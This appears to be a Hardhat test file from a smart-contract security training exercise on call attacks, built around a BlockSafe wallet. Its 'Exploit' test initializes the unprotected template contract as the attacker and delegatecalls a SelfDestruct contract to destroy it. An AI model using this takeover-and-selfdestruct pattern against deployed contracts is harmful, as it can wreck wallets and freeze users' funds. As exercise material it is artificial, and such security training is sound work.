...
import {BlockSafe, BlockSafeFactory, DummyERC20, SelfDestruct} from '../../typechain-types';

const {provider, deployContract, getSigners, parseEther, keccak256, toUtf8Bytes} = ethers;

/**
 * @dev run "npx hardhat test test/call-attacks-4/tests.ts"
 */
describe('Calls Attacks Exercise 4', function () {
  ...
  before(async function () {
    ...
    blockSafe1 = (await ethers.getContractAt(
      'src/call-attacks-4/BlockSafe.sol:BlockSafe',
      blockSafe1Address,
    )) as unknown as BlockSafe;
    ...
    await expect(blockSafe1.connect(user2).executeWithValue(user2.address, '0x', parseEther('1'))).to.be.revertedWith(
      'Not an operator',
    );
    // execute fails
    const TokenFactory = await ethers.getContractFactory('src/utils/DummyERC20.sol:DummyERC20', deployer);
    const callData = TokenFactory.interface.encodeFunctionData('balanceOf', [deployer.address]);
    await expect(blockSafe1.connect(user2).execute(token.target, callData, CALL_OPERATION)).to.be.revertedWith(
      'Not an operator',
    );
  ...
  it('Exploit', async function () {
    ...
    let selfDestructContract = (await (
      await ethers.getContractFactory('SelfDestruct', attacker)
    ).deploy()) as SelfDestruct;

    await blockSafeTemplate.connect(attacker).initialize([attacker.address]);

    await blockSafeTemplate.connect(attacker).execute(selfDestructContract.target, '0x', DELEGATECALL_OPERATION);
  });
